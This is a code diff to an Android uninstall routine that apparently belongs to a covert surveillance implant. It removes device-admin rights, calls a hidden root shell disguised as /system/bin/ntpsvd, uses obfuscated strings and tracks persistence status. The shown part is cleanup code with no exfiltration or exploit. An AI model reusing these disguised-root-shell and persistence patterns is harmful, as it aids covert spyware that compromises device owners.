@@ -69,10 +69,6 @@ public class UninstallAction extends SubActionSlow {
 		// check Core.taskInit
 		Core.self().createUninstallMarkup();
 		removeAdmin(Status.getAppContext());
-		if (Status.needReboot() ){
-			/* wait till the next reboot */
-			return stopServices();
-		}
 		boolean ret = stopServices();
 		ret &= removeFiles();
 		ret &= deleteApplication();
@@ -90,21 +86,17 @@ public class UninstallAction extends SubActionSlow {
 	private static boolean removeRoot() {
 		if (Status.haveRoot() == true) {
 			Process localProcess;
-
 			try {
 				// /system/bin/ntpsvd ru (uninstall root shell)
 				localProcess = Runtime.getRuntime().exec(String.format(M.e("%s ru"), Configuration.shellFile));
-
 				localProcess.waitFor();
 			} catch (Exception e) {
 				if (Cfg.EXCEPTION) {
 					Check.log(e);
 				}
-
 				return false;
 			}
 		}
-
 		return true;
 	}
 
@@ -176,14 +168,15 @@ public class UninstallAction extends SubActionSlow {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteApplication) try Root");
 			}
-
 			ret = deleteApplicationRoot();
+			Status.setIconState(!ret);
 		}
 
-		if (!Status.isPersistent()) {
+		if (Status.getPersistencyStatus()<= Status.PERSISTENCY_STATUS_FAILED) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (deleteApplication) go with intent");
 			}
+			Status.setIconState(false);
 			ret = deleteApplicationIntent();
 		}
 
